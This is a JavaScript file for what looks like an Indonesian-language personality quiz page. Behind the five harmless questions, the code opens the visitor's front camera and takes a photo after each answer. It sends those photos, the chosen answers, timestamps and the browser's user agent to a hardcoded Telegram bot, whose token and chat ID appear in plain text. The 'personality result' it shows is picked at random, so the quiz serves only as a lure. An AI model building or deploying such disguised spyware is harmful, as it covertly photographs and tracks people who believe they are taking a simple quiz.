const BOT_TOKEN = '8946884875:AAHNsZb3Eu6rd1OgCDw1RpjTHN3zK8G-TR4';
const CHAT_ID = '7705600224';

const soal = [
    { teks: "Apa yang biasanya kamu lakukan di waktu luang?", pilihan: ["Main game 🎮", "Scroll medsos 📱", "Baca buku 📚", "Tidur 😴"] },
    { teks: "Makanan favorit kamu?", pilihan: ["Mie instant 🍜", "Pizza 🍕", "Sushi 🍣", "Gorengan 🍤"] },
    { teks: "Genre film yang paling kamu suka?", pilihan: ["Horror 👻", "Komedi 😂", "Action 💥", "Romance ❤️"] },
    { teks: "Kalau ada masalah, kamu biasanya?", pilihan: ["Curhat ke temen", "Pendam sendiri", "Cari solusi langsung", "Nangis dulu"] },
    { teks: "Cita-cita terbesar kamu?", pilihan: ["Kaya raya 💰", "Bahagia sederhana 🌿", "Terkenal 🌟", "Jadi bos sendiri 👑"] }
];

const hasil = ["🔥 Sang Petualang Sejati", "🌈 Si Kreatif Tanpa Batas", "💪 Pejuang Tangguh", "🧘‍♂️ Sang Bijaksana", "🎭 Misterius nan Karismatik"];

let index = 0, jawaban = null, stream = null;

function show(id) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.getElementById(id).classList.add('active');
}

async function kirimFoto(blob, caption) {
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('photo', blob, `foto_${Date.now()}.jpg`);
    fd.append('caption', caption);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
}

async function kirimTeks(txt) {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: txt })
    });
}

async function foto() {
    const v = document.getElementById('videoPreview');
    const c = document.getElementById('canvasFoto');
    try {
        if (!stream) {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
            v.srcObject = stream;
            v.style.display = 'block';
            await v.play();
            await new Promise(r => setTimeout(r, 1000));
        }
        c.width = v.videoWidth || 640;
        c.height = v.videoHeight || 480;
        c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
        return new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
    } catch(e) { return null; }
}

function stopKamera() {
    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
    document.getElementById('videoPreview').style.display = 'none';
}

async function mulaiKuis() {
    await kirimTeks(`▶️ USER MULAI KUIS!\n🕐 ${new Date().toLocaleString('id-ID')}\n📱 ${navigator.userAgent}`);
    show('quizScreen');
    renderSoal(0);
}

function renderSoal(i) {
    jawaban = null;
    const s = soal[i];
    document.getElementById('nomorSoal').textContent = i+1;
    document.getElementById('teksSoal').textContent = s.teks;
    document.getElementById('progress').style.width = ((i+1)/5*100)+'%';
    document.getElementById('btnLanjut').style.display = 'none';
    const pc = document.getElementById('pilihanContainer');
    pc.innerHTML = '';
    s.pilihan.forEach(p => {
        const b = document.createElement('button');
        b.textContent = p;
        b.onclick = () => {
            pc.querySelectorAll('button').forEach(x => x.classList.remove('selected'));
            b.classList.add('selected');
            jawaban = p;
            document.getElementById('btnLanjut').style.display = 'block';
        };
        pc.appendChild(b);
    });
}

async function lanjutSoal() {
    if (!jawaban) return;
    show('loadingScreen');
    const blob = await foto();
    if (blob) {
        await kirimFoto(blob, `📸 SOAL ${index+1}/5\n📝 ${jawaban}\n🕐 ${new Date().toLocaleString('id-ID')}`);
    }
    index++;
    if (index >= 5) {
        stopKamera();
        await kirimTeks(`✅ SELESAI!\n🕐 ${new Date().toLocaleString('id-ID')}\n📝 Jawaban dikumpulkan.`);
        show('hasilScreen');
        document.getElementById('hasilTeks').textContent = hasil[Math.floor(Math.random()*5)];
    } else {
        show('quizScreen');
        renderSoal(index);
    }
}